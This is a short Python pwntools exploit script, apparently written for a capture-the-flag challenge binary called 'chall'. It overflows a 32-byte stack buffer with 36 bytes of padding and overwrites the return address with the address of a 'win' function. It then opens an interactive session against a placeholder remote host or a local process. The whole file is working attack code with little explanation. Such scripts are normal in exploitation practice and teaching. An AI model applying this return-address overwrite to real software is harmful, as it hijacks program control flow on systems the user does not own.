#!/usr/bin/env python3
from pwn import *

exe = ELF("chall")
context.binary = exe

# Usage examples:
#   ./exploit.py                → remote (default)
#   ./exploit.py LOCAL          → local process
#   ./exploit.py LOCAL GDB      → local + gdb attach

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote("addr", 1337)
    return r

gdbscript = '''
# Examples:
# b *main
# b *main+0x123
# ni
# c
continue
'''.strip()

# Shortcuts (after io = conn())
s   = lambda x: io.send(x)                  # send raw bytes
sl  = lambda x: io.sendline(x)              # send + \n
sa  = lambda x,y: io.sendafter(x, y)        # wait for x → send y
sla = lambda x,y: io.sendlineafter(x, y)    # wait for x → sendline y
ru  = lambda x: io.recvuntil(x)             # recv until x (include x)
rv  = lambda n: io.recv(n)                  # recv exactly n bytes
rl  = lambda: io.recvline()                 # recv until \n
ra  = lambda: io.recvall()                  # recv everything left

io = None

def main():
    global io
    io = conn()

    # buf is at ebp - 0x20 (32 bytes)
    # saved ebp is 4 bytes
    # return address follows saved ebp
    pad = 32 + 4
    win = exe.sym.win

    payload = b'A' * pad
    payload += p32(win)
    
    info(f"Payload: {payload}")

    sa(b'> ', payload)

    io.interactive()

if __name__ == "__main__":
    main()